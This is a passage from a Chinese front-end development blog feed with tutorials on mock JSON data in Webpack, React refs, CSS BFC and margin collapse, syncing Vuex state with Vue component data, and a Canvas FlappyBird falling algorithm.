在开发过程中使用假数据</h1><p>由Webpack的特性，项目在本地开发时，通过本地服务器可以访问到 <code>/public</code> 文件夹中的数据，也就是说我们可以再额外创建一个 <code>/api</code> 目录在 <code>/public</code> 目录下，在该目录下防止一些 json 文件来用以模拟访问的 json 数据，这样我们就可以通过 axios 直接访问 <code>http://localhost:8080/api/xxx.json</code> 来获取数据。</p><h1 id="5-用ref获取DOM元素"><a href="#5-用ref获取DOM元素" class="headerlink" title="5. 用ref获取DOM元素"></a>5. 用ref获取DOM元素</h1><p>当我们要获取jsx中的某个DOM元素时，可以使用ref来获取，然后将ref对象作为参数传入方法中，我们就可以在方法中处理该DOM了，例如我们再点击“换一批”时，需要获取icon字体，改变其样式</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  &lt;SearchInfoSwitch </span><br><span class="line"><span class="addition">+   onClick=&#123;() =&gt; handlePageChange(this.spinIcon)&#125;</span></span><br><span class="line">  &gt;</span><br><span class="line">    &lt;i </span><br><span class="line"><span class="addition">+     ref=&#123;(icon) =&gt; &#123; this.spinIcon = icon &#125;&#125; </span></span><br><span class="line">      className=&quot;iconfont spin&quot;</span><br><span class="line">    &gt;&lt;/i&gt;换一批</span><br><span class="line">  &lt;/SearchInfoSwitch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目实战 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于BFC的特性以及如何利用BFC解决margin相关的问题</title>
      <link href="/2019/05/7609fd87243c.html"/>
      <url>/2019/05/7609fd87243c.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-何为BFC"><a href="#1-何为BFC" class="headerlink" title="1. 何为BFC?"></a>1. 何为BFC?</h1><blockquote><p>文章：<a href="https://juejin.im/post/5909db2fda2f60005d2093db#heading-8">https://juejin.im/post/5909db2fda2f60005d2093db#heading-8</a></p></blockquote><p>BFC概括：可以在心中记住这么一个概念———所谓的BFC就是css布局的一个概念，是一块区域，一个环境。</p><p>BFC(Block formatting context)直译为”块级格式化上下文”。它是一个独立的渲染区域，只有Block-level box参与， 它规定了内部的Block-level Box如何布局，并且与这个区域外部毫不相干。</p><p>FC是formatting context的首字母缩写，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。</p><p>常见的FC有<code>BFC</code>、<code>IFC</code>（行级格式化上下文），还有<code>GFC</code>（网格布局格式化上下文）和<code>FFC</code>（自适应格式化上下文），这里就不再展开了。</p><h1 id="2-触发BFC的方式"><a href="#2-触发BFC的方式" class="headerlink" title="2. 触发BFC的方式"></a>2. 触发BFC的方式</h1><p>满足下列条件之一就可触发BFC</p><ol><li>根元素，即HTML元素</li><li>float的值不为none</li><li>overflow的值不为visible</li><li>display的值为inline-block、table-cell、table-caption</li><li>position的值为absolute或fixed</li></ol><h1 id="3-布局规则"><a href="#3-布局规则" class="headerlink" title="3. 布局规则"></a>3. 布局规则</h1><ol><li>内部的Box会在垂直方向，一个接一个地放置。</li><li>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠</li><li>每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</li><li>BFC的区域不会与float box重叠。</li><li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</li></ol><h1 id="4-BFC作用"><a href="#4-BFC作用" class="headerlink" title="4. BFC作用"></a>4. BFC作用</h1><ol><li>自适应两栏布局</li><li>可以阻止元素被浮动元素覆盖</li><li>可以包含浮动元素——清除内部浮动</li><li><del>分属于不同的BFC时可以阻止margin重叠</del></li></ol><h1 id="5-BFC解决margin问题"><a href="#5-BFC解决margin问题" class="headerlink" title="5. BFC解决margin问题"></a>5. BFC解决margin问题</h1><p>使用margin存在两种问题，一种是穿透问题，一种是折叠问题。</p><h2 id="5-1-穿透问题"><a href="#5-1-穿透问题" class="headerlink" title="5.1 穿透问题"></a>5.1 穿透问题</h2><p>穿透问题即为子级元素的垂直方向margin会穿透父级元素，导致父级元素发生位移，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20190522110557.png" alt="20190522110557.png"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190522110624.png" alt="20190522110624.png"></p><h2 id="5-2-margin折叠问题"><a href="#5-2-margin折叠问题" class="headerlink" title="5.2 margin折叠问题"></a>5.2 margin折叠问题</h2><p>margin折叠问题即为同属一个BFC中的垂直元素的垂直margin值在页面计算时发生了折叠而并不会累加</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20190522110846.png" alt="20190522110846.png"></p><h2 id="5-3-两种问题应该如何解决"><a href="#5-3-两种问题应该如何解决" class="headerlink" title="5.3 两种问题应该如何解决"></a>5.3 两种问题应该如何解决</h2><h3 id="5-3-1-解决margin溢出"><a href="#5-3-1-解决margin溢出" class="headerlink" title="5.3.1 解决margin溢出"></a>5.3.1 解决margin溢出</h3><p>解决margin穿透问题可以使用BFC的特性来将父级元素设置为一个独立的BFC，子级元素的margin值就不会溢出父级，而是将父级作为一个独立区域去计算margin值，我们这里用 <code>overflow: hidden</code> 来触发父级的BFC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inner&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20190522111410.png" alt="20190522111410.png"></p><h3 id="5-3-2-解决margin重叠"><a href="#5-3-2-解决margin重叠" class="headerlink" title="5.3.2 解决margin重叠"></a>5.3.2 解决margin重叠</h3><p>网上很多文章都说可以使用BFC特性来解决margin折叠其实是错误的，如果我们用 <code>overflow: hidden</code> 将两个div设置为不同的两个BFC区域，那么我们会发现该重叠的还是会重叠。</p><p>查阅相关资料显示只有以下一种方式可以使元素上下margin不折叠：</p><blockquote><p>浮动元素、inline-block 元素、绝对定位元素的 margin 不会和垂直方向上其他元素的 margin 折叠（注意这里指的是上下相邻的元素） </p><p>作者：丁小倪 链接：<a href="https://www.zhihu.com/question/19823139/answer/13610574">https://www.zhihu.com/question/19823139/answer/13610574</a> 来源：知乎</p></blockquote><p>之所以很多文章生成BFC可以解决垂直margin重叠的问题，是因为浮动元素、inline-block 元素、绝对定位元素都在触发了BFC的同时解决了重叠问题。也就是说可以解决垂直margin重叠问题的方法都可以让元素具有BFC特性，但是让元素具有BFC特性不一定能够解决垂直margin重叠的问题。</p><p>所以如果我们需要解决margin重叠问题，那就将元素设置为浮动元素，或者将其设置为 inline-block 元素，或者使用绝对定位，但这些都会对元素的样式产生副作用，我们采用将元素设置为 inline-block 元素的方法来演示如何解决这一问题（注意 <code>inline-block</code> 元素对空格敏感，会导致两个div之间出现空隙，具体的解决方法看：<a href="https://segmentfault.com/a/1190000010934928">https://segmentfault.com/a/1190000010934928</a> ）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20190522122552.png" alt="20190522122552.png"></p><p>其实如果利用BFC特性也能实现去掉上下margin的效果，只不过原理上还是利用BFC阻止margin溢出，我们可以将两个div套上一个BFC的外壳，这样两个BFC的内部元素就不会互相影响了：</p><blockquote><p>作者：陈厚毅 链接：<a href="https://www.zhihu.com/question/19823139/answer/50075651">https://www.zhihu.com/question/19823139/answer/50075651</a> 来源：知乎</p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20190522122826.png" alt="20190522122826.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> BFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现vuex与组件data之间的数据同步更新</title>
      <link href="/2019/05/f23acccccf7e.html"/>
      <url>/2019/05/f23acccccf7e.html</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>我们都知道，在Vue组件中，<code>data</code>部分的数据与视图之间是可以同步更新的，假如我们更新了<code>data</code>中的数据，那么视图上的数据就会被同步更新，这就是Vue所谓的数据驱动视图思想。</p><p>当我们使用Vuex时，我们也可以通过在视图上通过 <code>$store.state.[DataKey]</code> 来获取Vuex中 <code>state</code> 的数据，且当 <code>state</code> 中的数据发生变化时，视图上的数据也是可以同步更新的，这似乎看起来很顺利。</p><p>但是当我们想要通过将 <code>state</code> 中的数据绑定到Vue组件的 <code>data</code> 上，然后再在视图上去调用 <code>data</code> ，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;userInfo&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">userInfo</span>: <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">userInfo</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么我们就会发现，当我们去改变 <code>state</code> 中的 <code>userInfo</code> 时，视图是不会更新的，相对应的 <code>data</code> 中的 <code>userInfo</code> 也不会被更改，因为这种调用方式是非常规的。</p><p>当Vue在组件加载完毕前，会将 <code>data</code> 中的所有数据初始化完毕，之后便只会被动改变数据。然而等组件数据初始化完毕之后，即使 <code>state</code> 中的数据发生了改变， <code>data</code> 中的数据与其并非存在绑定关系，<code>data</code> 仅仅在数据初始化阶段去调用了 <code>state</code> 中的数据，所以 <code>data</code> 中的数据并不会根据 <code>state</code> 中的数据发生改变而改变。</p><p>所以如果想在视图上实现与 <code>state</code> 中的数据保持同步更新的话，只能采用以下方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.userInfo&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>那么如果我们必须想要在 <code>data</code> 上绑定 <code>state</code> 中的数据，让 <code>state</code> 去驱动 <code>data</code> 发生改变，那我们该如何做呢？</p><p>我们可以尝试以下两中方法：</p><h2 id="1-使用computed属性去获取state中的数据"><a href="#1-使用computed属性去获取state中的数据" class="headerlink" title="1. 使用computed属性去获取state中的数据"></a>1. 使用computed属性去获取state中的数据</h2><p>这种方式其实并非是去调用了 <code>data</code> 中的数据，而是为组件添加了一个计算 <code>computed</code> 属性。<code>computed</code> 通常用于复杂数据的计算，它实际上是一个函数，在函数内部进行预算后，返回一个运算结果，同时它有一个重要的特性：<strong>当在它内部需要进行预算的数据发生改变后，它重新进行数据运算并返回结果。</strong> 所以，我们可以用 <code>computed</code> 去返回 <code>state</code> 中的数据，当 <code>state</code> 中的数据发生改变后，<code>computed</code> 会感知到，并重新获取 <code>state</code> 中的数据，并返回新的值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;userInfo&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">userInfo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">userInfo</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-使用watch监听state中的数据"><a href="#2-使用watch监听state中的数据" class="headerlink" title="2. 使用watch监听state中的数据"></a>2. 使用watch监听state中的数据</h2><p>这种方式就很好理解了，就是通过组件的 <code>watch</code> 属性，为 <code>state</code> 中的某一项数据添加一个监听，当数据发生改变的时候触发监听事件，在监听事件内部中去更改 <code>data</code> 中对应的数据，即可变相的让 <code>data</code> 中的数据去根据 <code>state</code> 中的数据发生改变而改变。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;userInfo&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">userInfo</span>: <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">state</span>.<span class="property">userInfo</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">watch</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;this.$store.state.userInfo&quot;</span>() &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">userInfo</span> = <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">getters</span>.<span class="property">getUserInfo</span>; <span class="comment">// 按照规范在这里应该去使用getters来获取数据</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Canvas的FlappyBird小游戏开发总结</title>
      <link href="/2019/05/99d2d28d17b2.html"/>
      <url>/2019/05/99d2d28d17b2.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/EsunR/FlappyBird-Canvas">Github 源码地址</a>  </p><p><a href="https://www.esunr.xyz/git/FlappyBird/index.html">演示 Demo</a></p><h1 id="掉落算法"><a href="#掉落算法" class="headerlink" title="掉落算法"></a>掉落算法</h1><p>我们现在要研究一个问题，就是某元素一开始位置是y=100，如果限制变化常数是8，此时第一帧变为y=1e8（变化8），第二帧变为y=124（变化16）。第三帧是y=156（变化32）</p><p><img src="http://markdown.img.esunr.xyz/20190510210237.png" alt=""></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">img.onload = function () &#123;</span><br><span class="line">  setInterval(function () &#123;</span><br><span class="line">    ctx.clearRect(0, 0, 600, 600);</span><br><span class="line">    f++;</span><br><span class="line">    ctx.fillText(f, 20, 20);</span><br><span class="line">    ctx.fillText(`isDropDown: $&#123;isDropDown&#125;`, 20, 40);</span><br><span class="line"></span><br><span class="line">    if (isDropDown) &#123;</span><br><span class="line"><span class="addition">+     dropf++</span></span><br><span class="line"><span class="addition">+     y += dropf * 0.35; // 每帧下落的距离</span></span><br><span class="line"><span class="addition">+     d += 0.07;  // 每帧旋转的弧度</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx.save();</span><br><span class="line">    ctx.translate(x, y); // 将坐标系拉到要绘制小鸟的位置</span><br><span class="line">    ctx.rotate(d);  // 旋转坐标系</span><br><span class="line">    ctx.drawImage(img, -24, -24); // 绘制小鸟</span><br><span class="line">    ctx.restore();</span><br><span class="line">  &#125;, 20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给界面设置一个 <code>isEnergy</code> 的参数，记录小鸟是否拥有能量。当点击屏幕时，小鸟拥有能量，等小鸟上飞一段时间后小鸟失去能量，之后小鸟开始下落。</p><p>那么上升的这段距离，与掉落的公式不同，应该为：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- y += dropf * 0.35;</span></span><br><span class="line"><span class="addition">+ y -= (20 - dropf) * 0.35;</span></span><br></pre></td></tr></table></figure><p><code>dropf</code> 为小鸟自身动画的帧编号， <code>y</code> 为小鸟在画布上的y轴坐标。当小鸟开始上升，y的值需要线性减小。</p><p>当 <code>drop &lt; 20</code> 时，<code>(20 - dropf) * 0.35;</code> 是一个正数，y越减越小，说明小鸟开始下落。但当 <code>drop &gt; 20</code> 时，<code>(20 - dropf) * 0.35;</code> 的值是一个负数，y越减越大，说明小鸟又开始下落了，就会产生如下效果：</p><p><img src="http://markdown.img.esunr.xyz/%E5%9E%83%E5%9C%BE%E7%AE%B1.gif" alt=""></p><p>这说明：<strong>小鸟上升了20帧后，开始进行掉落。</strong></p><p>那么我们结合掉落算法与 <code>hasEnergy</code> 进行小鸟能量状态的判断，当用户点击Canvas时，小鸟获取能量（hasEnergy == true），之后小鸟上飞一段距离，失去能量（hasEnergy == false），同时进行小鸟头部旋转的调整。</p><p>在此要注意，我们要控制 <code>dropf</code> 何时归零，因为 <code>dropf</code> 控制了每帧小鸟移动的距离，即控制了小鸟的速度，拥有能量和失去能量时，小鸟的速度都需要初始化，即把 <code>dropf</code> 归零，我们在以下情况下需要将 <code>dropf</code> 归零：</p><ol><li>用户点击Canvas时，小鸟获取能量，上升速度初始化</li><li>小鸟准备下落时，<code>hasEnergy</code> 改为 <code>false</code>，同时小鸟需要以初始速度下落。</li></ol><p>这部分的代码入下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">var</span> dropf = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> hasEnergy = <span class="literal">false</span>; <span class="comment">// 能量状态</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 清屏... ...</span></span><br><span class="line">  </span><br><span class="line">  dropf++</span><br><span class="line">  <span class="comment">// 鼠标点击屏幕，会给小鸟传递能量</span></span><br><span class="line">  <span class="keyword">if</span> (!hasEnergy) &#123;</span><br><span class="line">    <span class="comment">// 如果没有能量，小鸟掉落并旋转</span></span><br><span class="line">    y += dropf * <span class="number">0.6</span>;</span><br><span class="line">    d += <span class="number">0.05</span>;  <span class="comment">// 每帧旋转的弧度</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果有能量，小鸟先想上飞，再掉落</span></span><br><span class="line">    y -= (<span class="number">20</span> - dropf) * <span class="number">0.35</span>; <span class="comment">// 每帧下落的距离</span></span><br><span class="line">    d -= <span class="number">0.03</span>;</span><br><span class="line">    <span class="keyword">if</span> (dropf &gt; <span class="number">20</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果向上飞了20帧，就让小鸟失去能量重新开始下落</span></span><br><span class="line">      hasEnergy = <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">// 下落时小鸟帧设置为0,归为下落速度的初始值</span></span><br><span class="line">      dropf = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 绘制小鸟... ...</span></span><br><span class="line">&#125;, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">canvas.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  hasEnergy = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// 下落前小鸟帧设置为0,归为上升速度的初始值</span></span><br><span class="line">  dropf = <span class="number">0</span>;</span><br><span class="line">  d = <span class="number">0</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="碰撞检测"><a href="#碰撞检测" class="headerlink" title="碰撞检测"></a>碰撞检测</h1><p>管子和小鸟的碰撞，会导致游戏结束，就要检测碰撞。<br>类和类之间如何通信？</p><ul><li>类和类之间没有第三方，需要通过发布订阅模式（观察者模式）</li><li>类和类之间有一个中介者，比如这个游戏，此时非常简单，直接通过中介者就能找到对方，比如： <figure class="highlight 